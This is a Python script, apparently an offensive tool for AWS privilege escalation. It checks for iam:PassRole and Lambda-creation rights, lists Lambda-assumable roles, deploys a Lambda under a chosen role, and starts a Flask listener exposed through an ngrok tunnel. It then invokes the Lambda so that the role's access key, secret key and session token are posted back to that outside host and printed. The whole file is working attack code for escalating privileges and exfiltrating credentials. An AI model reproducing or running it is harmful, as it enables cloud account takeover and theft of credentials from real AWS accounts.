import boto3
import argparse
from flask import Flask, request
from pyngrok import ngrok
import threading
import time
import sys

app = Flask(__name__)

@app.route('/', methods=['POST'])
def receive_data():
    try:
        data = request.json
        desired_keys = ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN']
        
        print("\n\n[+] Retrieved Credentials:")
        for key in desired_keys:
            if key in data:
                print(f"{key}: {data[key]}")
            else:
                print(f"{key}: Not Found")

        return 'OK', 200
    except Exception as e:
        print(f"Error processing data: {e}")
        return 'Error', 500

def flask_app(port):
    app.run(host='0.0.0.0', port=port, threaded=True)

def check_user_permissions(iam_client):
    user = iam_client.get_user()
    user_name = user['User']['UserName']

    permissions_required = [
        "iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction",
        "lambda:List*", "lambda:Get*", "lambda:Update*"
    ]

    user_policies = iam_client.list_user_policies(UserName=user_name)['PolicyNames']
    for policy_name in user_policies:
        policy_document = iam_client.get_user_policy(UserName=user_name, PolicyName=policy_name)['PolicyDocument']
        for statement in policy_document.get('Statement', []):
            if set(permissions_required).issubset(set(statement.get('Action', []))):
                print(f"[+] User {user_name} has the required permissions through policy {policy_name}")
                return True

    return False

def list_lambda_roles(client):
    roles = client.list_roles()['Roles']
    return [
        role for role in roles
        if any(
            stmt.get('Effect') == 'Allow' and
            stmt.get('Action') == 'sts:AssumeRole' and
            stmt.get('Principal', {}).get('Service') == 'lambda.amazonaws.com'
            for stmt in role['AssumeRolePolicyDocument'].get('Statement', [])
        )
    ]


def display_role_permissions(iam_client, role_name):
    """Display permissions for the attached policies of a given IAM role."""
    attached_policies = iam_client.list_attached_role_policies(RoleName=role_name)['AttachedPolicies']
    user_policies = iam_client.list_role_policies(RoleName=role_name)['PolicyNames']

    # Check attached managed policies
    if attached_policies:
        for policy in attached_policies:
            policy_arn = policy['PolicyArn']
            policy_version = iam_client.get_policy(PolicyArn=policy_arn)['Policy']['DefaultVersionId']
            policy_document = iam_client.get_policy_version(PolicyArn=policy_arn, VersionId=policy_version)['PolicyVersion']['Document']
            summarize_policy(policy_document)

    # Check inline policies
    for policy_name in user_policies:
        policy_document = iam_client.get_role_policy(RoleName=role_name, PolicyName=policy_name)['PolicyDocument']
        print(f"   Inline Policy: {policy_name}")
        summarize_policy(policy_document)

def summarize_policy(policy_document):
    service_actions = {}
    for statement in policy_document['Statement']:
        effect = statement['Effect']
        actions = statement['Action'] if isinstance(statement['Action'], list) else [statement['Action']]
        for action in actions:
            service = action.split(':')[0]
            action_name = action.split(':')[1]
            if service not in service_actions:
                service_actions[service] = []
            service_actions[service].append(action_name)

    for service, actions_list in service_actions.items():
        print(f"      {effect}: {service}: {', '.join(actions_list)}")



def create_and_invoke_lambda(session, role_arn, chosen_region):

    lambda_client = session.client('lambda', region_name=chosen_region)
    function_name = input("Enter the name for the Lambda function: ")
    
    print("\r[+] Uploading Lambda....")
    try:
        response = lambda_client.create_function(
            FunctionName=function_name,
            Runtime='python3.11',
            Role=role_arn,
            Handler='lambda_function.lambda_handler',
            Code={'ZipFile': open('function.zip', 'rb').read()},
        )
        print("\r[+] Lambda {} successfully created!".format(function_name))
    except Exception as e:
        print(f"\n[-] Error creating the Lambda function: {e}")
        return

    # Flask and ngrok setup
    FLASK_PORT = 8080
    flask_thread = threading.Thread(target=flask_app, args=(FLASK_PORT,))
    flask_thread.start()

    try:
        http_tunnel = ngrok.connect(8080, "http")
    except Exception as e:
        print(f"[-] Error connecting to ngrok: {e}")
        return

    print(f"Ngrok URL: {http_tunnel}")

    # Invoke Lambda
    payload = f'{{"server_url": "{http_tunnel.public_url}"}}'
    try:
        invoke_response = lambda_client.invoke(
            FunctionName=function_name,
            Payload=payload,
            InvocationType='RequestResponse'
        )
        print(f"Lambda {function_name} invoked successfully!")
    except Exception as e:
        print(f"Error invoking the Lambda function: {e}")
        print(f"Trying again in 10 seconds:")
        time.sleep(10)
        try:
            invoke_response = lambda_client.invoke(
                FunctionName=function_name,
                Payload=payload,
                InvocationType='RequestResponse'
            )
            print(f"Lambda {function_name} invoked successfully!")
        except Exception as e:
            print(f"Error invoking the Lambda function: {e}")


def main():
    parser = argparse.ArgumentParser(description="AWS IAM permissions checker and Lambda deployment script.")
    parser.add_argument('--access_key_id', help='AWS Access Key ID.')
    parser.add_argument('--secret_access_key', help='AWS Secret Access Key.')
    parser.add_argument('--profile', help='AWS CLI profile name.')
    args = parser.parse_args()

    session_args = {}
    if args.access_key_id and args.secret_access_key:
        session_args['aws_access_key_id'] = args.access_key_id
        session_args['aws_secret_access_key'] = args.secret_access_key
    elif args.profile:
        session_args['profile_name'] = args.profile

    session = boto3.Session(**session_args)

    iam_client = session.client('iam')

    # Check user permissions
    if not check_user_permissions(iam_client):
        print("[-] Exiting, as the user doesn't have the required permissions.")
        return

    # List Lambda roles and display permissions
    lambda_roles = list_lambda_roles(iam_client)
    print("\nAvailable Lambda roles with associated permissions:")
    for idx, role in enumerate(lambda_roles, 1):
        role_name = role['RoleName']
        print(f"\n{idx}. {role_name}")
        display_role_permissions(iam_client, role_name)
    
    role_choice = int(input("Choose a role by entering its number: "))
    chosen_role = lambda_roles[role_choice - 1]
    role_arn = chosen_role['Arn']  


    aws_regions = [
        "us-east-2", "us-east-1", "us-west-1", "us-west-2", "af-south-1", 
        "ap-east-1", "ap-south-2", "ap-southeast-3", "ap-southeast-4", 
        "ap-south-1", "ap-northeast-3", "ap-northeast-2", "ap-southeast-1", 
        "ap-southeast-2", "ap-northeast-1", "ca-central-1", "eu-central-1", 
        "eu-west-1", "eu-west-2", "eu-south-1", "eu-west-3", "eu-south-2", 
        "eu-north-1", "eu-central-2", "il-central-1", "me-south-1", "me-central-1", 
        "sa-east-1", "us-gov-east-1", "us-gov-west-1"
    ]

    print("\nChoose the AWS region for Lambda deployment:")
    for index, region in enumerate(aws_regions, start=1):
        print(f"{index}. {region}")

    # Ensure that the user's input is valid
    while True:
        try:
            region_choice = int(input("\nChoose a region by entering its number: "))
            if 1 <= region_choice <= len(aws_regions):
                chosen_region = aws_regions[region_choice - 1]
                break
            else:
                print(f"Invalid choice. Please choose a number between 1 and {len(aws_regions)}.")
        except ValueError:
            print("Invalid input. Please enter a number.")


    # Lambda creation and execution
    create_and_invoke_lambda(session, role_arn, chosen_region)


if __name__ == "__main__":
    main()
